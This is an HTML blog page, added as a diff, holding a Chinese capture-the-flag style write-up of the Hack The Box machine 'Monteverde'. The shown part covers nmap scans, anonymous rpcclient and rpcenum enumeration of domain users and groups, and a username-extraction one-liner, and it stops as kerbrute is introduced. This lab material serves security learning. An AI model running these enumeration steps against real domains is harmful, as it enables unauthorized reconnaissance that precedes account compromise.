@@ -1,0 +1,808 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：RPC服务获取域用户ID、弱密码、SMB匿名登录、敏感信息泄露、密码账号枚举、Azure Admins、Azure AD Connect">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Monteverde-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/05/11/Monteverde-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：RPC服务获取域用户ID、弱密码、SMB匿名登录、敏感信息泄露、密码账号枚举、Azure Admins、Azure AD Connect">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Monteverde-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Monteverde-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Monteverde-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Monteverde-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Monteverde-htb-writeup/5.png">
+<meta property="article:published_time" content="2024-05-11T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-05-16T14:11:42.670Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Monteverde-htb-writeup/1.png">
+  
+  
+  
+  <title>Monteverde-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Monteverde-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-11 23:50" pubdate>
+          2024年5月11日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          29k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          241 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Monteverde-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：RPC服务获取域用户ID、弱密码、SMB匿名登录、敏感信息泄露、密码账号枚举、Azure Admins、Azure AD Connect</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.172</p>
+<p>2、获取下开放端口情况：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> -oG allports <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-11 23:11 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span><br>Host is up (<span class="hljs-number">0.14</span>s latency).<br>Not shown: <span class="hljs-number">65516</span> filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br><span class="hljs-number">53</span>/tcp    open  domain<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec<br><span class="hljs-number">135</span>/tcp   open  msrpc<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds<br><span class="hljs-number">464</span>/tcp   open  kpasswd5<br><span class="hljs-number">593</span>/tcp   open  http-rpc-epmap<br><span class="hljs-number">636</span>/tcp   open  ldapssl<br><span class="hljs-number">3268</span>/tcp  open  globalcatLDAP<br><span class="hljs-number">3269</span>/tcp  open  globalcatLDAPssl<br><span class="hljs-number">5985</span>/tcp  open  wsman<br><span class="hljs-number">9389</span>/tcp  open  adws<br><span class="hljs-number">49667</span>/tcp open  unknown<br><span class="hljs-number">49673</span>/tcp open  unknown<br><span class="hljs-number">49674</span>/tcp open  unknown<br><span class="hljs-number">49675</span>/tcp open  unknown<br><span class="hljs-number">49736</span>/tcp open  unknown<br><span class="hljs-number">55252</span>/tcp open  unknown<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">20.42</span> seconds<br>                                                                                                                                                                                        <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ grep -oP <span class="hljs-string">&#x27;([0-9]+/open)&#x27;</span> allports | awk -F/ <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-number">53</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">464</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49673</span>,<span class="hljs-number">49674</span>,<span class="hljs-number">49675</span>,<span class="hljs-number">49736</span>,<span class="hljs-number">55252</span>,                           <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p53,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">464</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49673</span>,<span class="hljs-number">49674</span>,<span class="hljs-number">49675</span>,<span class="hljs-number">49736</span>,<span class="hljs-number">55252</span> --min-rate=<span class="hljs-number">10000</span> -sC -sV <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-11 23:13 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span><br>Host is up (<span class="hljs-number">0.11</span>s latency).<br><br>PORT      STATE SERVICE       VERSION<br><span class="hljs-number">53</span>/tcp    open  domain        Simple DNS Plus<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-11</span> <span class="hljs-number">07</span>:<span class="hljs-number">10</span>:<span class="hljs-number">10</span>Z)<br><span class="hljs-number">135</span>/tcp   open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds?<br><span class="hljs-number">464</span>/tcp   open  kpasswd5?<br><span class="hljs-number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span>/tcp   open  tcpwrapped<br><span class="hljs-number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)<br><span class="hljs-number">3269</span>/tcp  open  tcpwrapped<br><span class="hljs-number">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/<span class="hljs-number">2.0</span><br>|_http-title: Not Found<br><span class="hljs-number">9389</span>/tcp  open  mc-nmf        .NET Message Framing<br><span class="hljs-number">49667</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49673</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49674</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">49675</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49736</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">55252</span>/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   date: <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-11</span>T07:<span class="hljs-number">11</span>:<span class="hljs-number">10</span><br>|_  start_date: N/A<br>| smb2-security-mode: <br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: <br>|_    Message signing enabled and required<br>|_clock-skew: <span class="hljs-number">-8</span>h03m31s<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">100.05</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、经过枚举，发现rpc服务可以匿名获取一些用户信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rpcclient -U <span class="hljs-string">&quot;&quot;</span> -N <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span><br>rpcclient $&gt;<br>rpcclient $&gt; getusername<br>Account Name: ANONYMOUS LOGON, Authority Name: NT AUTHORITY<br>rpcclient $&gt; enumdomusers<br>user:[Guest] rid:[<span class="hljs-number">0x1f5</span>]<br>user:[AAD_987d7f2f57d2] rid:[<span class="hljs-number">0x450</span>]<br>user:[mhope] rid:[<span class="hljs-number">0x641</span>]<br>user:[SABatchJobs] rid:[<span class="hljs-number">0xa2a</span>]<br>user:[svc-ata] rid:[<span class="hljs-number">0xa2b</span>]<br>user:[svc-bexec] rid:[<span class="hljs-number">0xa2c</span>]<br>user:[svc-netapp] rid:[<span class="hljs-number">0xa2d</span>]<br>user:[dgalanos] rid:[<span class="hljs-number">0xa35</span>]<br>user:[roleary] rid:[<span class="hljs-number">0xa36</span>]<br>user:[smorgan] rid:[<span class="hljs-number">0xa37</span>]<br>rpcclient $&gt; lookupnames Guest<br>result was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; enumdomgroups<br>group:[Enterprise Read-only Domain Controllers] rid:[<span class="hljs-number">0x1f2</span>]<br>group:[Domain Users] rid:[<span class="hljs-number">0x201</span>]<br>group:[Domain Guests] rid:[<span class="hljs-number">0x202</span>]<br>group:[Domain Computers] rid:[<span class="hljs-number">0x203</span>]<br>group:[Group Policy Creator Owners] rid:[<span class="hljs-number">0x208</span>]<br>group:[Cloneable Domain Controllers] rid:[<span class="hljs-number">0x20a</span>]<br>group:[Protected Users] rid:[<span class="hljs-number">0x20d</span>]<br>group:[DnsUpdateProxy] rid:[<span class="hljs-number">0x44e</span>]<br>group:[Azure Admins] rid:[<span class="hljs-number">0xa29</span>]<br>group:[File Server Admins] rid:[<span class="hljs-number">0xa2e</span>]<br>group:[Call Recording Admins] rid:[<span class="hljs-number">0xa2f</span>]<br>group:[Reception] rid:[<span class="hljs-number">0xa30</span>]<br>group:[Operations] rid:[<span class="hljs-number">0xa31</span>]<br>group:[Trading] rid:[<span class="hljs-number">0xa32</span>]<br>group:[HelpDesk] rid:[<span class="hljs-number">0xa33</span>]<br>group:[Developers] rid:[<span class="hljs-number">0xa34</span>]<br>rpcclient $&gt; getdcname<br>Usage: getdcname domainname<br>rpcclient $&gt; lsaquery<br>Domain Name: MEGABANK<br>Domain Sid: S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-391775091</span><span class="hljs-number">-850290835</span><span class="hljs-number">-3566037492</span><br>rpcclient $&gt; srvinfo<br>do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; enumdomains<br>name:[MEGABANK] idx:[<span class="hljs-number">0x0</span>]<br>name:[Builtin] idx:[<span class="hljs-number">0x0</span>]<br>rpcclient $&gt; querydominfo<br>Domain:         MEGABANK<br>Server:<br>Comment:<br>Total Users:    <span class="hljs-number">51</span><br>Total Groups:   <span class="hljs-number">0</span><br>Total Aliases:  <span class="hljs-number">23</span><br>Sequence No:    <span class="hljs-number">1</span><br>Force Logoff:   <span class="hljs-number">-1</span><br>Domain Server State:    <span class="hljs-number">0x1</span><br>Server Role:    ROLE_DOMAIN_PDC<br>Unknown <span class="hljs-number">3</span>:      <span class="hljs-number">0x1</span><br>rpcclient $&gt; <br></code></pre></td></tr></table></figure>
+
+<p>4、下面直接枚举用户名并使用正则并提取出来用户名ID</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rpcclient -U <span class="hljs-string">&quot;&quot;</span> -N <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> -c <span class="hljs-string">&quot;enumdomusers&quot;</span> | grep -oP <span class="hljs-string">&quot;\[.*?\]&quot;</span> | grep -v <span class="hljs-number">0</span>x | tr -d <span class="hljs-string">&quot;[]&quot;</span> &gt; users<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat users         <br>Guest<br>AAD_987d7f2f57d2<br>mhope<br>SABatchJobs<br>svc-ata<br>svc-bexec<br>svc-netapp<br>dgalanos<br>roleary<br>smorgan<br></code></pre></td></tr></table></figure>
+
+<p>5、这里其实除了使用rpcclient工具，也可以使用rpcenum工具进行枚举的，下面举例一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/tools]<br>└─$ sudo ./rpcenum -i <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> -e All<br>[sudo] kali 的密码：<br><br>[*] Enumerating Domain Users...<br><br>  +                   +<br>  | Users             |<br>  +                   +<br>  | Guest             |<br>  | AAD_987d7f2f57d2  |<br>  | mhope             |<br>  | SABatchJobs       |<br>  | svc-ata           |<br>  | svc-bexec         |<br>  | svc-netapp        |<br>  | dgalanos          |<br>  | roleary           |<br>  | smorgan           |<br>  +                   +<br><br>[*] Listing domain users with description...<br><br>  +                   +                                                                                                                                                    +<br>  | User              | Description                                                                                                                                        |<br>  +                   +                                                                                                                                                    +<br>  | Guest             | Built-in account <span class="hljs-keyword">for</span> guest access to the computer/domain                                                                                           |<br>  | AAD_987d7f2f57d2  | Service account <span class="hljs-keyword">for</span> the Synchronization Service with installation identifier <span class="hljs-number">05</span>c97990<span class="hljs-number">-7587</span><span class="hljs-number">-4</span>a3d-b312<span class="hljs-number">-309</span>adfc172d9 running on computer MONTEVERDE.  |<br>  +                   +                                                                                                                                                    +<br><br>[*] Enumerating Domain Admin Users...<br><br>  +                   +<br>  | DomainAdminUsers  |<br>  +                   +<br><br>[*] Enumerating Domain Groups...<br><br>  +                                          +                                                                                                                   +<br>  | DomainGroup                              | Description                                                                                                       |<br>  +                                          +                                                                                                                   +<br>  | Enterprise Read-only Domain Controllers  | Members of this group are Read-Only Domain Controllers in the enterprise                                          |<br>  | Domain Users                             | All domain users                                                                                                  |<br>  | Domain Guests                            | All domain guests                                                                                                 |<br>  | Domain Computers                         | All workstations and servers joined to the domain                                                                 |<br>  | Group Policy Creator Owners              | Members in this group can modify group policy <span class="hljs-keyword">for</span> the domain                                                      |<br>  | Cloneable Domain Controllers             | Members of this group that are domain controllers may be cloned.                                                  |                      <br>  | Protected Users                          | Members of this group are afforded additional protections against authentication security threats. See http       |                      <br>  | DnsUpdateProxy                           | DNS clients who are permitted to perform dynamic updates on behalf of some other <span class="hljs-title function_">clients</span> <span class="hljs-params">(such as DHCP servers)</span>.  |                      <br>  | Azure Admins                             |                                                                                                                   |                      <br>  | File Server Admins                       |                                                                                                                   |                      <br>  | Call Recording Admins                    |                                                                                                                   |                      <br>  | Reception                                |                                                                                                                   |                      <br>  | Operations                               |                                                                                                                   |                      <br>  | Trading                                  |                                                                                                                   |                      <br>  | HelpDesk                                 |                                                                                                                   |                      <br>  | Developers                               |                                                                                                                   |                      <br>  +                                          +                                                                                                                   + <br></code></pre></td></tr></table></figure>
+
+<p>6、下面我我们在绑定下本地hosts域名信息后，使用kerbrute工具验证下域用户是否都存在</p>
